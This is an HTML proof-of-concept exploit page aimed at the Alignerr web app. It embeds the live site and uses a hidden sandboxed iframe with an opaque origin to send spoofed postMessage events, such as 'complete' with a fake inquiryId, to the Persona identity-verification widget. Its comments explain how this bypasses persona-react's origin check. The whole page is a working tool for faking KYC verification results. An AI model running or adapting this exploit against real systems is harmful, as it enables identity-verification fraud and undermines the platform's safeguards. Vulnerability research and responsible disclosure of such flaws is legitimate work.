<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Alignerr KYC PoC</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #0f0f0f;
      color: #e0e0e0;
      display: flex;
      flex-direction: column;
      height: 100vh;
      overflow: hidden;
    }

    #toolbar {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 8px 12px;
      background: #1a1a2e;
      border-bottom: 1px solid #2a2a4a;
      flex-shrink: 0;
      flex-wrap: wrap;
    }

    #toolbar h1 {
      font-size: 13px;
      font-weight: 600;
      color: #7c83fd;
      white-space: nowrap;
      margin-right: 4px;
    }

    .sep { width: 1px; height: 24px; background: #2a2a4a; }

    label {
      font-size: 11px;
      color: #888;
      white-space: nowrap;
    }

    select, input[type="text"] {
      background: #12122a;
      border: 1px solid #3a3a5a;
      border-radius: 4px;
      color: #e0e0e0;
      font-size: 12px;
      padding: 4px 7px;
    }

    input[type="text"] { width: 220px; }

    button {
      padding: 5px 14px;
      border-radius: 4px;
      border: none;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.15s;
    }
    button:hover { opacity: 0.85; }

    #btn-fire    { background: #7c83fd; color: #fff; }
    #btn-clear   { background: #333; color: #aaa; }
    #btn-listen  { background: #2a4a2a; color: #6fda6f; }

    #origin-badge {
      font-size: 11px;
      padding: 3px 8px;
      border-radius: 10px;
      background: #2a1a1a;
      border: 1px solid #6f2020;
      color: #f06060;
      white-space: nowrap;
    }
    #origin-badge.bypassed {
      background: #1a2a1a;
      border-color: #206f20;
      color: #60f060;
    }

    #main {
      display: flex;
      flex: 1;
      overflow: hidden;
    }

    #alignerr-frame {
      flex: 1;
      border: none;
    }

    #panel {
      width: 340px;
      flex-shrink: 0;
      display: flex;
      flex-direction: column;
      border-left: 1px solid #2a2a4a;
      background: #111122;
      overflow: hidden;
    }

    #panel-header {
      padding: 8px 12px;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.08em;
      color: #555;
      text-transform: uppercase;
      border-bottom: 1px solid #2a2a4a;
      background: #0f0f1e;
      flex-shrink: 0;
    }

    #payload-editor {
      flex: 0 0 auto;
      padding: 10px 12px;
      border-bottom: 1px solid #2a2a4a;
    }

    #payload-editor textarea {
      width: 100%;
      height: 160px;
      background: #0a0a18;
      border: 1px solid #2a2a4a;
      border-radius: 4px;
      color: #a0e0a0;
      font-family: 'Fira Code', 'Courier New', monospace;
      font-size: 11px;
      padding: 8px;
      resize: vertical;
    }

    #log {
      flex: 1;
      overflow-y: auto;
      padding: 8px 12px;
      font-family: 'Fira Code', 'Courier New', monospace;
      font-size: 11px;
    }

    .log-entry {
      margin-bottom: 8px;
      padding: 6px 8px;
      border-radius: 4px;
      border-left: 3px solid #555;
      background: #0d0d1e;
      word-break: break-all;
    }
    .log-entry.sent  { border-color: #7c83fd; }
    .log-entry.recv  { border-color: #6fda6f; }
    .log-entry.err   { border-color: #f06060; }
    .log-entry.info  { border-color: #888; }

    .log-entry .meta {
      font-size: 10px;
      color: #666;
      margin-bottom: 3px;
    }
    .log-entry .body { color: #ccc; }

    /* hidden exploit iframe */
    #exploit-iframe { display: none; }
  </style>
</head>
<body>

<!-- ── TOOLBAR ─────────────────────────────────────────── -->
<div id="toolbar">
  <h1>Alignerr KYC PoC</h1>
  <div class="sep"></div>

  <label>Event</label>
  <select id="sel-event">
    <option value="complete">complete</option>
    <option value="fail">fail</option>
    <option value="exit">exit (cancel)</option>
    <option value="error">error</option>
    <option value="ready">ready</option>
    <option value="load">load</option>
  </select>

  <label>inquiryId</label>
  <input type="text" id="inp-inquiry" value="inq_spoofed00000000000000" />

  <div class="sep"></div>

  <button id="btn-fire">⚡ Fire</button>
  <button id="btn-listen">👂 Listen</button>
  <button id="btn-clear">Clear log</button>

  <span id="origin-badge">origin: (not sent yet)</span>
</div>

<!-- ── MAIN ───────────────────────────────────────────── -->
<div id="main">

  <!-- Alignerr app (frame index 0) -->
  <iframe
    id="alignerr-frame"
    src="https://app.alignerr.com/"
    sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads allow-modals allow-top-navigation"
    allow="camera; microphone; geolocation; identity-credentials-get; publickey-credentials-get; clipboard-write"
    allowfullscreen
    referrerpolicy="origin"
  ></iframe>

  <!-- Side panel -->
  <div id="panel">
    <div id="panel-header">Message payload / log</div>
    <div id="payload-editor">
      <textarea id="payload-ta" spellcheck="false"></textarea>
    </div>
    <div id="log"></div>
  </div>
</div>

<!--
  Exploit iframe (frame index 1).
  sandbox="allow-scripts"  — NO allow-same-origin → opaque origin → event.origin === "" at receiver.
  This is the key to bypassing persona-react's origin check:
    if ("" !== r.origin) { ... }   ← skipped when origin is empty string
-->
<iframe
  id="exploit-iframe"
  sandbox="allow-scripts"
></iframe>

<script>
// ── helpers ────────────────────────────────────────────
const log = document.getElementById('log');
const badge = document.getElementById('origin-badge');
const payloadTa = document.getElementById('payload-ta');
const selEvent = document.getElementById('sel-event');
const inpInquiry = document.getElementById('inp-inquiry');
const exploitFrame = document.getElementById('exploit-iframe');

function addLog(type, meta, body) {
  const el = document.createElement('div');
  el.className = `log-entry ${type}`;
  el.innerHTML = `<div class="meta">${meta}</div><div class="body">${
    typeof body === 'string' ? escHtml(body) : escHtml(JSON.stringify(body, null, 2))
  }</div>`;
  log.prepend(el);
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── build default payload ──────────────────────────────
function buildPayload() {
  const name = selEvent.value;
  const inquiryId = inpInquiry.value.trim();

  // Mirror the exact shape persona-react reads:
  //   r.data.name, r.data.metadata.inquiryId, r.data.metadata.status, r.data.metadata.fields
  const payload = {
    name,
    metadata: {
      inquiryId,
      status: name === 'fail' ? 'failed' : 'completed',
      fields: {},
      scopes: {}
    }
  };

  if (name === 'error') {
    payload.error = 'Spoofed error';
    delete payload.metadata;
  }
  if (name === 'exit') {
    payload.metadata = { inquiryId, sessionToken: null };
  }

  return payload;
}

function syncTextarea() {
  payloadTa.value = JSON.stringify(buildPayload(), null, 2);
}
syncTextarea();
selEvent.addEventListener('change', syncTextarea);
inpInquiry.addEventListener('input', syncTextarea);

// ── fire exploit ───────────────────────────────────────
document.getElementById('btn-fire').addEventListener('click', () => {
  let payload;
  try {
    payload = JSON.parse(payloadTa.value);
  } catch (e) {
    addLog('err', 'Parse error', e.message);
    return;
  }

  /*
    Mechanism:
    We inject a srcdoc into the sandboxed exploit iframe (frame[1]).
    That iframe has NO allow-same-origin → its origin is opaque → event.origin === "" at target.

    persona-react's guard:
      if ("" !== r.origin) { origin check … }
    When origin === "", the guard is skipped entirely, and the switch on r.data.name fires.

    The sandboxed iframe navigates the frame tree:
      window.parent.frames[0]  →  the alignerr iframe window
    Cross-origin frame navigation is allowed even in sandboxed iframes
    (frames / parent / top are cross-origin-accessible Window properties).
  */
  const src = `<!DOCTYPE html><html><body><script>
    var payload = ${JSON.stringify(payload)};
    try {
      // frames[0] = alignerr iframe (from parent's perspective)
      window.parent.frames[0].postMessage(payload, '*');
      window.parent.postMessage({__poc_sent: true, payload: payload}, '*');
    } catch(e) {
      window.parent.postMessage({__poc_error: e.message}, '*');
    }
  <\/script></body></html>`;

  exploitFrame.srcdoc = src;

  badge.textContent = 'origin: "" (sandboxed — bypass active)';
  badge.className = 'bypassed';
  addLog('sent', `⚡ Fired via sandboxed iframe → frames[0] | event: ${payload.name}`, payload);
});

// ── listen for confirmations / inbound messages ────────
document.getElementById('btn-listen').addEventListener('click', () => {
  addLog('info', '👂 Listening for window messages on this page…', '');
});

window.addEventListener('message', (e) => {
  if (e.data && e.data.__poc_sent) {
    addLog('info', `✅ Sandboxed iframe confirmed postMessage sent | origin seen by us: "${e.origin}"`, e.data.payload);
    return;
  }
  if (e.data && e.data.__poc_error) {
    addLog('err', `❌ Exploit iframe error: ${e.data.__poc_error}`, '');
    badge.textContent = 'origin: error';
    badge.className = '';
    return;
  }
  // Any other message (e.g. from alignerr echoing something back)
  addLog('recv', `📨 Message received | origin: "${e.origin}"`, e.data);
});

document.getElementById('btn-clear').addEventListener('click', () => {
  log.innerHTML = '';
});

addLog('info', 'Ready. Navigate the Alignerr iframe to the KYC/Persona page, then click ⚡ Fire.', '');
addLog('info', 'How it works: the exploit iframe has sandbox="allow-scripts" (no allow-same-origin). Its opaque origin causes event.origin === "" at the receiver, bypassing persona-react\'s guard: if ("" !== r.origin) { … }', '');
</script>
</body>
</html>
